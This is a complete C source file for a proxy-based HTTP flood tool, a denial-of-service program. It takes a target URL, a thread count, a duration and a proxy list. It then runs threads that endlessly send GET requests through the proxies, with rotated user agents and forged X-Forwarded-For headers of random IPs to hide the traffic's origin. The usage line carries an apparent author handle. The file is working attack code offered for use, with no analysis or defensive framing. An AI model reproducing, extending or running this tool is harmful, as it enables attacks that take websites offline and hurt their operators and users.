#include <sys/types.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h> 
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>

#define VASIZE(x) sizeof(x)/sizeof(x[0])
#define CHUNK 1024

int amount_of_proxies;
char** proxies_ips;
int* proxies_ports;
int* proxies_valid;

char* useragents[] = {
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
	"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
	"Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
	"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
	"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
	"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
	"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
	"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
	"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
	"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
	"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
	"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
	"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
	"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
	"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
};

long long int getTick() {
    struct timespec ts;
    unsigned theTick = 0U;
    clock_gettime( CLOCK_REALTIME, &ts );
    theTick  = ts.tv_nsec / 1000000;
    theTick += ts.tv_sec * 1000;
    return theTick;
}

int urandom_fd = -2;

void urandom_init()
{
	urandom_fd = open("/dev/urandom", O_RDONLY);
	
	if (urandom_fd == -1)
	{
		int errsv = urandom_fd;
		printf("Error opening [/dev/urandom]: %i\n", errsv);
		exit(1);
	}
}

unsigned long urandom()
{
	unsigned long buf_impl;
	unsigned long *buf = &buf_impl;
	
	if (urandom_fd == -2)
		urandom_init();

	read(urandom_fd, buf, sizeof(long));
	return buf_impl;
}

int hostname_to_ip(char* hostname , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
         
    if ( (he = gethostbyname( hostname ) ) == NULL) 
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
 
    addr_list = (struct in_addr **) he->h_addr_list;
     
    for(i = 0; addr_list[i] != NULL; i++) 
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
     
    return 1;
}

int cmp_str(char* str1, int len, char* str2, int len2)
{
	int i;
	if(len != len2)
		return 0;
	for(i = 0; i < len; i++)
	{
		if(str1[i] != str2[i])
			return 0;
	}
	return 1;
}

int* get_str_indexes(char* str, char* pattern, int* amount)
{
	int i;
	int* ret = NULL;
	int len1 = strlen(str) + 1;
	int len2 = strlen(pattern);
	if(len2 > len1)
		return NULL;
	int lenx = len1 - len2;
	*amount = 0;
	for(i = 0; i < lenx; i++)
	{
		if(cmp_str(&str[i], len2, pattern, len2))
		{
			*amount += 1;
			ret = (int*)realloc(ret, *amount * sizeof(int));
			int tmp = *amount;
			ret[tmp - 1] = i;
		}
	}
	return ret;
}

char* substr(char* str, int start, int end)
{
	int i;
	int total_size = end - start;
	int total_size_wz = total_size + 1;
	char* ret = (char*)malloc(total_size_wz);
	memset(ret, 0, total_size_wz);
	for(i = 0; i < total_size; i++)
		ret[i] = str[i + start];
	return ret;
}

char** str_split(char* str, const char* delim){
    char** res = NULL;
    char*  part;
    int i = 0;
	int amount = 0;
	int last_index = 0;
	int current = 0;

    char* aux = strdup(str);
	
	int* indexes = get_str_indexes(str, delim, &amount);
	
	if(amount > 0)
	{
		if(indexes[0] == 0)
			last_index = strlen(delim);
	}
	
	for(i = 0; i < amount; i++)
	{
		if(indexes[i] - last_index <= 0 && i == 0)
			continue;
		char* tmp = substr(aux, last_index, indexes[i]);
		res = (char**)realloc(res, (current + 1) * sizeof(char*));
		res[current] = tmp;
		last_index = indexes[i] + strlen(delim);
		current++;
	}
	
	if(last_index < strlen(aux))
	{
		char* tmp = substr(aux, last_index, strlen(aux));
		res = (char**)realloc(res, (current + 1) * sizeof(char*));
		res[current] = tmp;
		current++;
	}
	
	free(aux);
	free(indexes);
	
    res = (char**)realloc(res, (current + 1) * sizeof(char*));
    res[current] = NULL;

    return res;
}

int getSplitCount(char** sp)
{
	int i;
	int ret = 0;
	for(i = 0; sp[i] != NULL; i++)
		ret++;
	return ret;
}

char* concat(char* str1, char* str2)
{
	int total_size = strlen(str1) + strlen(str2);
	char* ret = (char*)malloc(total_size + 1);
	memset(ret, 0, total_size + 1);
	sprintf(ret, "%s%s", str1, str2);
	return ret;
}

char* remove_bchr_str(char* str, char bad)
{
	int i;
	int current = 0;
	int len = strlen(str);
	char* ret = (char*)malloc(len + 1);
	memset(ret, 0, len + 1);
	for(i = 0; i < len; i++)
	{
		if(str[i] != bad)
		{
			ret[current] = str[i];
			current++;
		}
	}
	return ret;
}

char* remove_str(char* str, char* bad)
{
	int i;
	char** sp0 = str_split(str, bad);
	int count = getSplitCount(sp0);
	char* ret = (char*)malloc(2);
	memset(ret, 0, 2);
	for(i = 0; i < count; i++)
	{
		char* dret = concat(ret, sp0[i]);
		free(sp0[i]);
		free(ret);
		ret = dret;
	}
	free(sp0);
	return ret;
}

char* randomIp()
{
	char* ret = (char*)malloc(30);
	memset(ret, 0, 30);
	sprintf(ret, "%d.%d.%d.%d", urandom() % 253 + 1, urandom() % 253 + 1, urandom() % 253 + 1, urandom() % 253 + 1);
	return ret;
}

char* randomIpList()
{
	int i;
	int rnd = urandom()%6 + 2;
	char* ret = (char*)malloc(30);
	memset(ret, 0, 30);
	for(i = 0; i < rnd; i++)
	{
		char* rnd_ip = randomIp();
		char* concated = concat(rnd_ip, ", ");
		free(rnd_ip);
		char* tret = concat(ret, concated);
		free(concated);
		free(ret);
		ret = tret;
	}
	char* dret = substr(ret, 0, strlen(ret) - 2);
	free(ret);
	return dret;
}

int SendGetHTTP(char* ip, int port, char* host, char* get, char* uagent, char* custom_params)
{
	int i;
	int sock;
	int len;
	int so_error;
	struct sockaddr_in server;
	fd_set fdset;
    struct timeval tv;
	struct timeval tv2;
	char message[1000];
	
	//Create socket
	sock = socket(AF_INET , SOCK_STREAM , 0);
	if (sock == -1)
	{
		//printf("Could not create socket\n");
		return 0;
	}
	
	//fcntl(sock, F_SETFL, O_NONBLOCK);
	
	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons( port );
	
	tv2.tv_sec = 3;  /* 30 Secs Timeout */
	tv2.tv_usec = 0;  // Not init'ing this can cause strange errors
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv2,sizeof(struct timeval));
	
	if(connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		close(sock);
		return 0;
	}
	
	/*FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    tv.tv_sec = 10;
    tv.tv_usec = 0;

    int rc = select(sock + 1, NULL, &fdset, NULL, &tv);
    switch(rc) {
		case 1: // data to read
			len = sizeof(so_error);

			getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);

			if (so_error == 0)
			{
				//printf("socket %s:%d connected\n", ip, port);
			} else { // error
				//printf("socket %s:%d NOT connected: %s\n", ip, port, strerror(so_error));
				close(sock);
				return 0;
			}
			break;
		case 0: //timeout
			//fprintf(stderr, "connection timeout trying to connect to %s:%d\n", ip, port);
			close(sock);
			return 0;
    }
	
	fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) & ~O_NONBLOCK);
	//*/
	/*if ( < 0)
	{
		printf("connection failed to: %s:%d\n", ip, port);
		close(sock);
		return 0;
	}*/
	
	if(strlen(get) + strlen(host) + strlen(uagent) + strlen(custom_params) > 860)
	{
		close(sock);
		//printf("payload too large\n");
		return 0;
	}
	
	memset(message, 0, sizeof(message));
	sprintf(message, 
					"GET %s HTTP/1.1\r\n"
					"Host: %s\r\n"
					"User-Agent: %s\r\n"
					"Accept-Encoding: gzip, deflate\r\n"
					"%s"
					"Connection: Keep-Alive, Persist\r\n"
					"Proxy-Connection: keep-alive\r\n"
					"\r\n",
					get, host, uagent, custom_params);
					
	//printf("%s\n", message);
	
	
	
	for(i = 0; i < 4; i++)
	{
		if( send(sock, message, strlen(message) , 0) < 0)
		{
			//printf("send failed\n");
			//close(sock);
			//return 0;
			break;
		}
	}
	
	char server_reply[1000];
	if( recv(sock , server_reply , 1000 , 0) < 0)
	{
		//printf("recv failed\n");
		//close(sock);
		//return 0;
	}
	
	usleep(25 * 1000);
	
	close(sock);
	
	return 1;
}

int read_file(char* filename, char **buf) 
{
	int r;
	int i;
	char *b;
	char *b2;
	FILE *fp = fopen(filename,"rb");
	int n = 0;
	
	b = malloc(CHUNK);
	b2 = (char*)malloc(2);
	memset(b2, 0, 2);
	while ((r = fread(b, sizeof(char), CHUNK, fp)) > 0) 
	{
		b2 = (char*)realloc(b2, n + r);
		for(i = 0; i < r; i++)
			b2[i+n] = b[i];
		n += r;
	}
	*buf = b2;
	free(b);
	fclose(fp);
	return n;
}

int GetProxies(char* filename)
{
	int i;
	char* buf;
	int size = read_file(filename, &buf);
	char** sp0 = str_split(buf, "\n");
	amount_of_proxies = getSplitCount(sp0);
	proxies_ips = (char**)malloc(sizeof(char*) * amount_of_proxies);
	proxies_ports = (int*)malloc(sizeof(int) * amount_of_proxies);
	proxies_valid = (int*)malloc(sizeof(int) * amount_of_proxies);
	for(i = 0; i < amount_of_proxies; i++)
		proxies_valid[i] = 1;
	for(i = 0; sp0[i] != NULL; i++)
	{
		char** sp1 = str_split(sp0[i], ":");
		int sp1_count = getSplitCount(sp1);
		if(sp1_count == 0)
		{
			proxies_ips[i] = "";
			proxies_ports[i] = 0;
			free(sp1);
		}
		else if(sp1_count < 2)
		{
			proxies_ips[i] = remove_bchr_str(sp1[0], '\r');
			proxies_ports[i] = 8080;
			free(sp1[0]);
			free(sp1);
		}
		else
		{
			proxies_ips[i] = remove_bchr_str(sp1[0], '\r');
			proxies_ports[i] = atoi(sp1[1]);
			free(sp1[0]);
			free(sp1[1]);
			free(sp1);
		}
		// -- //
		free(sp0[i]);
	}
	free(sp0);
	return 0;
}

char* attack_url;
char* attack_host_url;

static void* Attack_Thread(void *arg)
{
	int i;
	char cm_ford[1000];
	memset(cm_ford, 0, 1000);
	char* rnd_ip_list = randomIpList();
	sprintf(cm_ford, "X-Forwarded-For: %s\r\n", rnd_ip_list);
	free(rnd_ip_list);
	int random_ua = urandom() % VASIZE(useragents);
	int random_proxy = urandom() % amount_of_proxies;
	int id = (int)arg;
	if(id % 50 == 0)
		printf("Thread %d created successfully\n", id);
	if(id < amount_of_proxies)
		random_proxy = id;
	while(1)
	{
		proxies_valid[random_proxy] = SendGetHTTP(proxies_ips[random_proxy], proxies_ports[random_proxy], attack_host_url, attack_url, useragents[random_ua], cm_ford);
		if(proxies_valid[random_proxy] == 0)
		{
			random_proxy = urandom() % amount_of_proxies;
			continue;
		}
	}
	return NULL;
}

int main(int argc , char *argv[])
{
	int i;
	int s;
	int stack_size;
	pthread_attr_t attr;
	pthread_t* tid;
	if(argc != 5)
	{
		printf("Skype:b0ss4ss_Usage: ./bprox {target} {threads} {seconds} {file_proxy}\n");
		return 0;
	}
	// -- //
	attack_url = argv[1];
	char* tmp_c = remove_str(attack_url, "http://");
	char* tmp_c2 = remove_str(tmp_c, "https://");
	free(tmp_c);
	char** sp0 = str_split(tmp_c2, "/");
	free(tmp_c2);
	if(getSplitCount(sp0) == 0)
	{
		printf("error: bad host url.\n");
		return 0;
	}
	attack_host_url = sp0[0];
	int threads = atoi(argv[2]);
	int seconds = atoi(argv[3]);
	GetProxies(argv[4]);
	// -- //
	tid = (pthread_t*)malloc(sizeof(pthread_t) * threads);
	memset(tid, 0, sizeof(pthread_t) * threads);
	// -- //
	stack_size = 0x5000;
	s = pthread_attr_init(&attr);
	s = pthread_attr_setstacksize(&attr, stack_size);
	for(i = 0; i < threads; i++)
	{
		pthread_create(&(tid[i]), &attr, &Attack_Thread, (void*)(i));
		usleep(5 * 1000);
	}//*/
	long long int checktime = getTick();
	while(1)
	{
		if(getTick() - checktime > seconds * 1000)
			exit(1);
		usleep(1 * 1000 * 1000);
	}
	// -- //
	//printf("%s :: %s :: %d :: %d :: %d\n", attack_url, attack_host_url, threads, seconds, amount_of_proxies);
	
	
	return 0;
}